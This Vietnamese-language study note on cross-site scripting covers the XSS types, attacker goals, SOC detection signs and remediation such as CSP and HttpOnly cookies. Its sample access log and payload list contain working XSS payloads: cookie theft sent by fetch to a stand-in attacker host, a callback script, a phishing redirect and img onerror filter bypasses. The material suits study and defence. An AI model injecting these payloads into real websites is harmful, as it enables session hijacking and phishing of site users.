# Cross-Site Scripting (XSS)

## 1. Concept

**XSS** là lỗ hổng bảo mật xảy ra khi một ứng dụng web lấy dữ liệu không an toàn từ người dùng và gửi nó đến trình duyệt của người dùng khác mà không được kiểm duyệt hoặc mã hóa đúng cách.

* **ELI5:** Hãy tưởng tượng website là một bảng tin công cộng. Hacker lén dán một mảnh giấy có chứa "bùa chú" (mã JavaScript) lên đó. Khi bất kỳ ai đi ngang qua và đọc bảng tin, bùa chú sẽ tự động kích hoạt trên cơ thể người đó (trình duyệt), ép họ phải đưa chìa khóa nhà (Cookie) cho hacker.
* **Điểm mấu chốt:** Khác với SQL Injection tấn công vào Database của Server, **XSS tấn công trực tiếp vào người dùng** cuối (Client-side).

## 2. Key Mechanism

XSS hoạt động dựa trên sự tin tưởng tuyệt đối của trình duyệt đối với các kịch bản (scripts) gửi về từ Website. Có 4 loại chính:

1. **Reflected XSS (Phản chiếu):** Mã độc nằm trong tham số URL (vd: ?search=\<script>...). Server nhận request và "phản chiếu" ngay lập tức payload này vào trang HTML trả về. Hacker cần lừa nạn nhân bấm vào link.
2. **Stored XSS (Lưu trữ):** Mã độc được gửi lên và **lưu vĩnh viễn** vào Database (vd: bình luận, profile). Mọi người dùng xem trang web đó sau này đều bị dính mã độc.
3. **DOM-based XSS:** Diễn ra hoàn toàn ở phía Client. JavaScript của trang web tự đọc dữ liệu từ một nguồn không an toàn (như # trên URL) và ghi vào cây DOM mà không qua Server.
4. **Blind XSS:** Một dạng Stored XSS nhưng mã độc thực thi ở một trang quản trị ẩn (Admin Portal) mà hacker không nhìn thấy được. Cần kỹ thuật Callback (gọi ngược) để lấy dữ liệu.

## 3. Security Perspective

### 🔴 Attacker View (Red Team)

Hacker tinh chỉnh **Payload** theo 2 phần: **Intention** (Mục đích) và **Modification** (Lách bộ lọc).

* **Mục tiêu:**
  * **Session Hijacking:** Đánh cắp document.cookie để chiếm quyền đăng nhập.
  * **Keylogging:** Ghi lại thao tác bàn phím của nạn nhân trên trang web.
  * **Phishing:** Thay đổi giao diện trang web (DOM manipulation) để lừa nạn nhân nhập mật khẩu vào form giả.
* **Kỹ thuật Bypass:** Mã hóa Hex, URL Encoding, hoặc sử dụng các thẻ HTML ít bị chú ý như \<img src=x onerror=alert(1)>.

### 🔵 Defender View (Blue Team/SOC)

SOC Analyst phát hiện XSS thông qua giám sát Inbound (Payload gửi lên) và Outbound (Dữ liệu bị đánh cắp gửi ra ngoài).

* **Dấu hiệu nhận biết (SOC Alert):**
  * **Script Tags in URL/Body:** Xuất hiện chuỗi \<script>, javascript:, hoặc các Event Handlers (onload, onerror, onmouseover).
  * **Encoded Payloads:** Các tham số chứa chuỗi %3Cscript%3E (URL encoded của \<script>).
  * **Session Token in Outbound Traffic:** (Phát hiện qua Proxy/WAF) Thấy chuỗi Cookie nhạy cảm xuất hiện trong một yêu cầu gửi tới một domain lạ.
  * **CSP Violations:** Nếu web có cài đặt **Content Security Policy**, trình duyệt sẽ gửi báo cáo khi có script lạ cố thực thi.
* **Giả lập dòng Log điển hình (Web Access Log):**

```
# Reflected XSS trong tham số tìm kiếm
192.168.10.5 - - [22/May/2024:10:00:01] "GET /search?q=<script>fetch('http://hacker.com/steal?c='+document.cookie)</script> HTTP/1.1" 200 1500

# Stored XSS gửi qua phương thức POST (Giai đoạn chèn mã)
192.168.10.5 - - [22/May/2024:10:05:10] "POST /api/comments HTTP/1.1" 200 120 "comment=<img src=x onerror=alert('XSS')>"

# Blind XSS gọi ngược về XSS Hunter (Dấu hiệu Callback)
192.168.10.5 - - [22/May/2024:10:10:05] "POST /support/ticket HTTP/1.1" 200 50 "msg=...<script src='https://xss.ht/hacker'></script>"
```

## 4. Useful Commands

### 🛠️ Common XSS Payloads

```javascript
// 1. Basic Alert (Proof of Concept)
<script>alert('XSS')</script>

// 2. Bypass Filter bằng thẻ IMG (Không dùng thẻ script)
<img src=x onerror=alert(1)>

// 3. Đánh cắp Cookie và gửi về Server của Hacker
<script>fetch('http://hacker.com/log?c=' + btoa(document.cookie))</script>

// 4. Redirect nạn nhân sang trang web giả mạo
<script>window.location.href='http://fake-login.com'</script>
```

### 🔒 Remediation & Hardening (Phòng thủ)

1. **Output Encoding:** Luôn mã hóa dữ liệu trước khi in ra HTML (vd: chuyển < thành \&lt;). Đây là cách phòng thủ quan trọng nhất.
2. **Input Validation:** Chỉ cho phép các định dạng dữ liệu mong muốn (vd: tuổi phải là số).
3. **Content Security Policy (CSP):** Thiết lập Header để chỉ cho phép chạy script từ các nguồn tin cậy.
   * `Content-Security-Policy: default-src 'self'; script-src 'self' trusted-scripts.com;`
4. **HttpOnly Cookie Flag:** Ngăn chặn JavaScript truy cập vào Cookie (Vô hiệu hóa đòn đánh cắp Session).
   * `Set-Cookie: session_id=abc123; HttpOnly; Secure;`

